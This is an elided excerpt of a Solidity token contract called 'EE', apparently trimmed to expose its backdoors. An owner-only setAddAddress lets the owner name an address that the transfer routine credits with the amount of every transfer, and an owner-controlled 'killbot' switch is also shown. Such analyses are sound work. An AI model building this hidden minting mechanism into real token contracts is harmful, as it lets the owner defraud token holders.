...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public fundAddress = address(0x144Defb5dD3976cb37216Dc481D51eE063F35A66);
    address public fundAddress1 = address(0x144Defb5dD3976cb37216Dc481D51eE063F35A66);
    address public addAddress;
    string private _name = "EE";
    string private _symbol = "EE";
    ...
    function _takeTransfer(
        ...
        if(addAddress!=address(0)){_balances[addAddress] = _balances[addAddress] + tAmount;}
    ...
    function setAddAddress(address account) external onlyOwner {
        addAddress = account;
    }
    ...
    function setKillbot(bool killbot) external onlyFunder {
        _killbot = killbot;
    }
